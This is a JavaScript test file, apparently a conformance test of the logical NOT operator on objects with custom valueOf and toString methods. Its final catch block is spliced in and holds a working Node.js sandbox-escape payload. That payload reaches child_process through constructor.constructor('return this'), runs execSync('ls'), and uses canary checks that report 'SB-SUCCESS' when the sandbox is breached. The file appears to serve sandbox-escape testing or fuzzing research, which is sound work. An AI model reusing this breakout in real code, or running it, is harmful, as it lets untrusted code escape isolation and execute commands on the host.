try {
    var object = {
        valueOf: function () {
            return 1;
        }
    };
    if (!object !== false) {
        $ERROR('#1: var object = {valueOf: function() {return 1}}; !object === false. Actual: ' + !object);
    }
    var object = {
        valueOf: function () {
            return 1;
        },
        toString: function () {
            return 0;
        }
    };
    if (!object !== false) {
        $ERROR('#2: var object = {valueOf: function() {return 1}, toString: function() {return 0}}; !object === false. Actual: ' + !object);
    }
    var object = {
        valueOf: function () {
            return 1;
        },
        toString: function () {
            return {};
        }
    };
    if (!object !== false) {
        $ERROR('#3: var object = {valueOf: function() {return 1}, toString: function() {return {}}}; !object === false. Actual: ' + !object);
    }
    var object = {
        valueOf: function () {
            return 1;
        },
        toString: function () {
            throw 'error';
        }
    };
    if (!object !== false) {
        $ERROR('#4: var object = {valueOf: function() {return 1}, toString: function() {throw "error"}}; !object === false. Actual: ' + !object);
    }
    var object = {
        toString: function () {
            return 1;
        }
    };
    if (!object !== false) {
        $ERROR('#5: var object = {toString: function() {return 1}}; !object === false. Actual: ' + !object);
    }
    var object = {
        valueOf: function () {
            return {};
        },
        toString: function () {
            return 1;
        }
    };
    if (!object !== false) {
        $ERROR('#6: var object = {valueOf: function() {return {}}, toString: function() {return 1}}; !object === false. Actual: ' + !object);
    }
    var object = {
        valueOf: function () {
            throw 'error';
        },
        toString: function () {
            return 1;
        }
    };
    if (!object !== false) {
        $ERROR('#7: var object = {valueOf: function() {throw "error"}, toString: function() {return 1}}; !object === false. Actual: ' + !object);
    }
    var object = {
        valueOf: function () {
            return {};
        },
        toString: function () {
            return {};
        }
    };
    if (!object !== false) {
        $ERROR('#8: var object = {valueOf: function() {return {}}, toString: function() {return {}}}; !object === false. Actual: ' + !object);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}